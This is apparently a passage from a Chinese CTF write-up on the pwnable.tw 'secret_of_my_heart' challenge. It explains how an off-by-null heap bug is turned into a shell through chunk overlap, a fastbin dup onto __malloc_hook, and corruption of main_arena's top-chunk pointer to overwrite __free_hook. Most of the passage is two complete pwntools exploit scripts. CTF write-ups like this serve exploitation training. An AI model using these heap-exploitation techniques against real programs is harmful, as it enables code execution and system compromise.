    one_gadget = 0xef6c4
    elf = ELF("./secret_of_my_heart")
    def new(size,name,secret):
    p.sendlineafter("choice :",str(1))
    p.sendlineafter("Size of heart : ",str(size))
    p.sendafter("Name of heart :",name)
    p.sendafter("secret of my heart :",secret)
    def show(index):
    p.sendlineafter("choice :",str(2))
    p.sendlineafter("Index :",str(index))
    def free(index):
    p.sendlineafter("choice :",str(3))
    p.sendlineafter("Index :",str(index))
    new(0xF8,"a"*0x20,"aaaa") #0
    new(0x68,"b"*0x20,"bbbb") #1
    new(0xF8,"c"*0x20,"cccc") #2
    new(0xF8,"d"*0x20,"dddd") #3
    new(0xF8,"e"*0x20,"eeee") #4
    free(2)
    free(0)
    new(0xF8,"c"*0x20,"c"*0xF0 + p64(0x100*2+0x70)) #0
    free(3)
    new(0xF8,"a"*0x20,"aaaa") #2
    show(1)
    p.recvuntil("Secret : ")
    bin_addr = u64(p.recvline()[:-1].ljust(0x8,"\x00"))
    libc.address = bin_addr - bin_offset
    malloc_hook = libc.symbols['__malloc_hook']
    one_gadget = libc.address + one_gadget
    success("libc_address ===> " + hex(libc.address))
    success("__malloc_hook ===> " + hex(malloc_hook))
    success("shell_address ===> " + hex(one_gadget))
    new(0x68,"b"*0x20,"bbbb") #3
    new(0x68,"c"*0x20,"cccc") #5
    #fastbin dup
    free(1)
    free(5)
    free(3)
    new(0x68,"d"*0x20,p64(malloc_hook-0x23)) #6
    new(0x68,"e"*0x20,"eeee") #7
    new(0x68,"f"*0x20,"ffff") #8
    payload = "\x00"*0x13 + p64(one_gadget)
    new(0x68,"fastbin attack",payload)
    #getshell
    free(6)
    p.interactive()
接下来介绍第四种思路的实现，因为思路挺好的，所以就算实现麻烦点，也是无所谓。
## 第四种思路
具体思路如下:
首先，我们知道，__malloc_hook和main_arena其实是相邻的，并且main_arena里面有一个指向top
chunk的指针。这样的话我们可以先fastbin
dup去申请到__malloc_hook-0x23这块内存，然后往main_arena里面写入0x70，再用fastbin
attack得到main_arena，控制top chunk的指针指向__free_hook上方，然后再去不断申请内存直至申请到__free_hook。
__malloc_hook和main_arena的位置如下:
利用__malloc_hook-0x23的0x7f来使用fastbin dup控制红框中的内容，往红框里面写入0x70，再进行一次fastbin
attack就可以控制指向top
chunk的指针，这里0x55e274cc0470就是topchunk的地址。红框内是fastbin数组，可以利用这个进行二次fastbin attack。
来看一下我们伪造topchunk的size。
__free_hook地址-0xb58的位置，红框内可以作为我们伪造的top chunk的size。我们只需要将指向top
chunk的指针指向__free_hook地址-0xb58的位置就可以了。
exp.py如下:
    from pwn import *
    #context.log_level = "debug"
    local = False
    if local:
    p = process("./secret\_of\_my_heart")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    bin_offset = 0x3C4B20 + 0x58
    one_gadget = 0xf02a4
    else:
    p = remote("chall.pwnable.tw","10302")
    libc = ELF("./libc_64.so.6")
    bin_offset = 0x3C3B20 + 0x58
    one_gadget = 0xef6c4
    elf = ELF("./secret_of_my_heart")
    def new(size,name,secret):
    p.sendlineafter("choice :",str(1))
    p.sendlineafter("Size of heart : ",str(size))
    p.sendafter("Name of heart :",name)
    p.sendafter("secret of my heart :",secret)
    def show(index):
    p.sendlineafter("choice :",str(2))
    p.sendlineafter("Index :",str(index))
    def free(index):
    p.sendlineafter("choice :",str(3))
    p.sendlineafter("Index :",str(index))
    new(0xF8,"a"*0x20,"aaaa") #0
    new(0x68,"b"*0x20,"bbbb") #1
    new(0xF8,"c"*0x20,"cccc") #2
    new(0xF8,"d"*0x20,"dddd") #3
    new(0xF8,"e"*0x20,"/bin/sh\x00") #4
    free(2)
    free(0)
    new(0xF8,"c"*0x20,"c"*0xF0 + p64(0x100*2+0x70)) #0
    free(3)
    new(0xF8,"a"*0x20,"aaaa") #2
    show(1)
    p.recvuntil("Secret : ")
    bin_addr = u64(p.recvline()[:-1].ljust(0x8,"\x00"))
    libc.address = bin_addr - bin_offset
    free_hook = libc.symbols['__free_hook']
    malloc_hook = libc.symbols['__malloc_hook']
    main_arena = bin_addr - 0x58
    success("libc_address ===> " + hex(libc.address))
    success("system_address ===> " + hex(libc.symbols['system']))
    success("__free_hook ===> " + hex(free_hook))
    new(0x68,"b"*0x20,"bbbb") #3
    new(0x68,"c"*0x20,"cccc") #5
    #fastbin dup
    free(1)
    free(5)
    free(3)
    new(0x68,"b"*0x20,p64(malloc_hook-0x23))
    new(0x68,"c"*0x20,"cccc")
    new(0x68,"d"*0x20,"dddd")
    payload = "\x00" * 0x13
    payload += "\x00" * 0x40
    payload += p64(main_arena+48)
    payload += p64(0x71)
    new(0x68,"e"*0x20,payload)
    new(0x68,"f"*0x20,p64(0x00)*3+p64(free_hook-0xb58))
    new(0x100,"padding\n","padding")
    new(0x100,"padding\n","padding")
    new(0x100,"padding\n","padding")
    new(0x100,"padding\n","padding")
    for i in range(7):
    new(0x100,"padding\\n","padding")
    new(0x100,"padding\n","\x00"*0xa8+p64(libc.symbols['system']))
    free(4)
    p.interactive()
## 总结
实际上，off by null漏洞就是通过chunk
overlap来实现UAF，所以这个东西本质上就是UAF。既然是UAF，所以拿到shell的思路或许还有不少。
附上参考链接：